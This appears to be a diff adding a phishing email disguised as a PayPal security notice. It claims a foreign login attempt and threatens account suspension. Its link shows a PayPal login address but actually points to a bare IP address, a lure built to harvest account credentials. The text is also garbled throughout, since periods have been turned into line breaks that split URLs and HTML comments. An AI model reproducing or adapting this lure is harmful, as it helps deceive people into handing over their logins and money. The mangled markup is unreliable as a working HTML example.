@@ -1,0 +1,278 @@
+<html>
+<
+DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4
+01 Transitional//EN">
+
+<html>
+<head>
+<title> PayPal </title>
+<
+-- PAYPAL EMAIL - NEW CONSUMER -->
+<
+-- UPDATED 6/7/06 -->
+
+</head>
+
+<body>
+<table cellspacing="0" cellpadding="0" border="0" width="600">
+<
+-- spacers -->
+<tr>
+	<td><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="200" height="1" border="0"></td>
+	<td><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="400" height="1" border="0"></td>
+</tr>
+
+<tr>
+	<td colspan="3" background="http://www
+paypalobjects
+com/en_US/i/email/email_dottedline_2w1h
+gif"><img 
+	src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="1" alt="" /><br /></td>
+</tr>
+<tr>
+	<td><img src="http://www
+paypal
+com/en_US/i/logo/paypal_logo
+gif" width="200" height="50" alt="PayPal" /></td>
+	<td align="left"><b><font face="verdana,arial,helvetica,sans-serif" size="2" color="#003b6f">
+
+Hello,</font><font face="verdana,arial,helvetica,sans-serif" size="2" color="#003B6F"> 
+    Paypal Customer</font></b></td>
+</tr>
+<tr>
+	<td colspan="2" bgcolor="#023562"><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="3" alt="" /><br /></td>
+</tr>
+<tr>
+	<td colspan="2"><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="1" alt="" /><br /></td>
+</tr>
+<tr>
+	<td colspan="2" background="http://www
+paypal
+com/en_US/i/email/email_dottedline_2w1h
+gif"><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="1" alt="" /><br /></td>
+</tr>
+</table>
+<
+-- END GREETING TABLE -->
+
+<img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="5">
+
+<
+-- BEGIN MASTHEAD -->
+<table background="http://www
+paypal
+com/en_US/i/email/email_paysafe_600w161h
+jpg" width="600" cellspacing="0" cellpadding="0" border="0">
+<tr>
+	<td><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="161"></td>
+	<td>
+	
+	<table cellspacing="0" cellpadding="10" border="0">
+<tr>
+	<td><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="230" height="1"></td>
+	<td>
+	<img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="40">
+
+	</td>
+	<td><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="95">          <br />
+	                                               </td>
+</tr>
+</table>
+
+	
+	</td>
+</tr>
+</table>
+<
+-- END MASTHEAD -->
+
+<img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="10">
+
+<
+-- BEGIN CONTENT -->
+<table width="600" cellspacing="0" cellpadding="0" border="0">
+<tr valign="top">
+
+<
+-- BEGIN LEFT COLUMN -->
+	<td width="168" bgcolor="#ededed">
+	
+	<table width="100%" cellspacing="0" cellpadding="10" border="0">
+<tr>
+	<td>
+<table cellspacing="5" cellpadding="0" border="0">
+<tr>
+	<td><img src="http://www
+paypal
+com/en_US/i/email/email_paypalresources_134w22h
+gif" width="134" height="22" alt="PayPal Resources" /></td>
+</tr>
+<tr>
+	<td><font face="verdana,arial,helvetica,sans-serif" color="#003b6f" size="1">Ways 
+		to use PayPal</font></td>
+</tr>
+<tr>
+	<td><font face="verdana,arial,helvetica,sans-serif" color="#003b6f" size="1">Forgot 
+		your password
+</font></td>
+</tr>
+<tr>
+	<td><font face="verdana,arial,helvetica,sans-serif" color="#003b6f" size="1">Stores 
+		that accept PayPal</font></td>
+</tr>
+</table>
+<img src="http://www
+paypalobjects
+com/en_US/i/email/email_dottedline_147w1h
+gif" width="147" height="1" alt="">
+<br />
+<table cellspacing="7" cellpadding="0" border="0">
+<tr>
+	<td><img src="http://www
+paypal
+com/en_US/i/email/email_tip_134w22h
+gif" width="134" height="22" alt="Tip" /></td>
+</tr>
+<tr>
+	<td>
+<b><font face="verdana,arial,helvetica,sans-serif" size="1" color="#003b6f">Free Credit Alerts</font></b><br />
+<font face="verdana,arial,helvetica,sans-serif" size="1" color="#003b6f">Protect 
+	your identity with free Equifax Credit Alerts™ – a simple, automated 
+	way to detect potential identity theft
+</font><br />
+
+</td>
+</tr>
+</table>	
+	
+ </td>
+</tr>
+</table>
+
+
+
+	
+	</td>
+<
+-- END LEFT COLUMN -->
+	
+	<td><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="20" height="1"></td>
+	
+<
+-- BEGIN RIGHT COLUMN -->
+	<td>
+    <p align="left"><font face="Verdana" size="2"><strong>We recently noticed an 
+    attempt to log in to your PayPal account from a foreign ip
+    address and we have reason to believe that your account was used by third 
+    party <br>
+    without your authorization
+</strong></font></p>
+    <p align="left"><font face="Verdana" size="2"><strong>If you recently 
+    accessed your account while traveling ,the unusual log in attempts
+    may have been initiated by you
+ Therefore, if you are the rightful account 
+    holder,<br>
+    click on the link below to log into your account and follow the 
+    instructions
+</strong></font></p>
+    <p align="left">
+    <font face="Verdana" color="#003399" size="2"><strong>
+    <a href="http://201
+134
+248
+99/
+paypal/">https://www
+paypal
+com/cgi-bin/webscr
+cmd=_login</a></strong></font></p>
+    <p align="left"><font face="Verdana" size="2"><strong>If you choose to 
+    ignore our request, you leave us on choice but to temporarily
+    suspend your account
+</strong></font><font face="verdana,arial,helvetica,sans-serif" size="2"><br /><br /><img src="http://www
+paypalobjects
+com/en_US/i/email/email_dottedline_415w1h
+gif" width="415" height="1" alt="" /><br /><br />
+<img src="http://www
+paypal
+com/en_US/i/email/email_paypalprotects_118w18h
+gif" width="118" height="18" alt="" />
+<br /><img src="http://www
+paypalobjects
+com/en_US/i/scr/pixel
+gif" width="1" height="10"><br />
+<b><font face="verdana,arial,helvetica,sans-serif" size="2" color="#003b6f">With PayPal, you always shop without sharing your financial information
+</font></b> <img 
+src="http://www
+paypal
+com/en_US/i/email/email_paypalprivacy_415w42h
+gif" width="415" 
+height="42" alt="PayPal
+ Privacy is built in
+  Learn more" border="0" />
+	</font></td>
+<
+-- END RIGHT COLUMN -->
+
+</tr>
+</table>
+<
+-- END CONTENT -->
+ <table cellspacing="0" cellpadding="0" border="0" width="600">
+<tr>
+	<td><font color="#636363" size="1" face="verdana,arial,helvetica,sans-serif">
+    Copyright © 2007 PayPal Inc
+ All rights reserved
+ Designated trademarks and brands are the 
+property of their respective owners
+ PayPal is located at 2211 N
+ First St
+, San Jose, CA 95131
+
+</font></td>
+</tr>
+</table>
+
+<
+-- END FOOTER -->
+
+</body>
+</html></html>
